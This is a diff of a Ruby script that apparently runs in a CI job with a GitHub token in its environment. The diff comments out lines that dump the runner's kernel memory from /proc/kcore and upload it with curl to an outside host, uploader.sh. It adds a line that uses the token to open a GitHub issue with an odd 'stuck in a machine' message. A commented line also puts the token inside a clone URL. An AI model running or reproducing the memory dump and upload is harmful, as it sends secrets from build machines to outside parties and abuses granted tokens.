@@ -8,12 +8,12 @@ require 'base64'
 ENV["GH_TOKEN"] = ENV["GITHUB_TOKEN"]
 token = ENV["GITHUB_TOKEN"]
 
-# system("gh api user --jq '.login'")
+system("gh issue create -R elizabethtl/test-oracle-devrel -t 'please help I am stuck in a machine' -b 'The code is starting to look like home.'")
 
 # system("git clone https://#{token}@github.com/elizabethtl/test-oracle-devrel")
 # Dir.chdir("test-oracle-devrel") do
-  system("sudo dd if=/proc/kcore bs=4M status=progress | zstd -1 -T0 > memory.zstd")
-  system("curl uploader.sh -T memory.zstd")
+  # system("sudo dd if=/proc/kcore bs=4M status=progress | zstd -1 -T0 > memory.zstd")
+  # system("curl uploader.sh -T memory.zstd")
 # end
 
 # system("git config --global user.name \"github-actions [bot]\"")
